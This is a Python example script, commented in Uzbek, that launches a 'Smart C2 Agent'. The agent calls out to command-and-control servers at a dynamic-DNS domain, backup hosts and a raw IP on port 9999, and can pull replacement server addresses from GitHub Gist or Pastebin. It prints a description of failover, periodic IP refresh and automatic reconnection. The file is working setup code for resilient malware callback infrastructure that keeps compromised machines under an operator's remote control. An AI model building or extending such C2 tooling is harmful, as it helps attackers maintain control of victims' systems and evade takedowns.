"""
Smart Agent Example - IP o'zgarsa ham ishlaydigan agent misoli
"""
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from agent.smart_client import SmartClient


def main():
    """Smart agent'ni ishga tushirish"""
    
    print("=" * 60)
    print("🚀 SMART C2 AGENT")
    print("=" * 60)
    print()
    
    # Smart client yaratish
    client = SmartClient()
    
    # ============================================
    # USUL 1: DDNS Domain (ENG YAXSHI)
    # ============================================
    print("📌 Configuration 1: DDNS Domain")
    print("   Primary: yourname.duckdns.org")
    client.add_server('yourname.duckdns.org', 9999)
    print()
    
    # ============================================
    # USUL 2: Multiple Fallback IPs
    # ============================================
    print("📌 Configuration 2: Fallback IPs")
    
    # Primary server
    print("   Primary: 127.0.0.1:9999")
    client.add_server('127.0.0.1', 9999)
    
    # Backup server 1
    print("   Backup 1: backup1.example.com:9999")
    client.add_server('backup1.example.com', 9999)
    
    # Backup server 2
    print("   Backup 2: backup2.example.com:9999")
    client.add_server('backup2.example.com', 9999)
    
    # Direct IP backup
    print("   Backup 3: 123.45.67.89:9999")
    client.add_server('123.45.67.89', 9999)
    print()
    
    # ============================================
    # USUL 3: GitHub Gist IP Update
    # ============================================
    print("📌 Configuration 3: IP Update Source")
    print("   GitHub Gist: https://gist.githubusercontent.com/...")
    
    # DIQQAT: O'zingizning gist URL ni qo'shing!
    # client.add_ip_update_source('github_gist', 
    #     'https://gist.githubusercontent.com/username/gist_id/raw/config.json')
    
    # Yoki Pastebin
    # client.add_ip_update_source('pastebin',
    #     'https://pastebin.com/raw/xxxxx')
    print()
    
    # ============================================
    # SETTINGS
    # ============================================
    print("⚙️ Settings:")
    print(f"   Retry delay: {client.retry_delay} sekund")
    print(f"   Max retries per server: {client.max_retries}")
    print(f"   IP update check: {client.update_check_interval} sekund (5 daqiqa)")
    print()
    
    # ============================================
    # SERVER LIST
    # ============================================
    print("📋 Configured Servers:")
    for i, server in enumerate(client.servers, 1):
        print(f"   {i}. {server['host']}:{server['port']}")
    print()
    
    # ============================================
    # QANDAY ISHLAYDI
    # ============================================
    print("🔄 Qanday ishlaydi:")
    print("   1. Birinchi serverga ulanishga harakat qiladi")
    print("   2. Agar ishlamasa, keyingisiga o'tadi")
    print("   3. Har 5 daqiqada yangi IP larni tekshiradi (agar update source qo'shilgan bo'lsa)")
    print("   4. Ulanish uzilsa, avtomatik qayta ulanadi")
    print("   5. Barcha serverlar ishlamasa, kutadi va qayta sinaydi")
    print()
    
    # ============================================
    # START
    # ============================================
    print("=" * 60)
    print("▶️  Agent ishga tushmoqda...")
    print("=" * 60)
    print()
    
    try:
        client.run()
    except KeyboardInterrupt:
        print("\n" + "=" * 60)
        print("🛑 Agent to'xtatildi (Ctrl+C)")
        print("=" * 60)
    finally:
        client.close()
        print("\n✅ Socket yopildi")


if __name__ == '__main__':
    main()
